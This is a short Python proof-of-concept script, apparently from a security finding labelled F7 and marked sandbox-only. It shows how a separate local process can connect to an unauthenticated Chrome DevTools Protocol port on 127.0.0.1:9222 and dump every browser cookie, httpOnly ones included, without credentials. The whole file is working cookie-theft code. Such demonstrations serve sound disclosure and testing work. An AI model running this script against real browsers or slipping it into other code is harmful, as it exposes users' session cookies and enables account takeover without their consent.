#!/usr/bin/env python3
"""Attacker side (F7): a SEPARATE local client dumps every cookie from the
unauthenticated CDP port -- no credentials, no consent. This is what any local
process (or an SSRF that can reach the port and speak CDP) can do.

SANDBOX ONLY.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _cdp import CDP  # noqa: E402

c = CDP()
cookies = c.call("Network.getAllCookies").get("result", {}).get("cookies", [])
print("\n*** COOKIES STOLEN via unauthenticated CDP (127.0.0.1:9222) ***")
print(f"[attacker] read {len(cookies)} cookie(s) with NO auth:")
for ck in cookies:
    print(f"  {ck.get('name')} = {ck.get('value')}   (domain={ck.get('domain')}, "
          f"httpOnly={ck.get('httpOnly')}, secure={ck.get('secure')})")
if not cookies:
    print("  (none found -- did the seed step run against the same browser/port?)")
c.close()
